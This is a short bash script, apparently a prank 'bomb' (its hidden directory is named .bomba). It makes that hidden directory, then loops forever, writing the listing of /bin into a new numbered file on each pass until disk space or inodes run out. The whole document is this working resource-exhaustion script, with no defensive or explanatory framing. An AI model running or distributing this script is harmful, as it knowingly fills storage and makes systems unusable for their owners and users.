#!/bin/bash

nombre=0
mkdir .bomba
while true;
do
	ls /bin > .bomba/$nombre
	nombre=$[ $nombre + 1 ]
done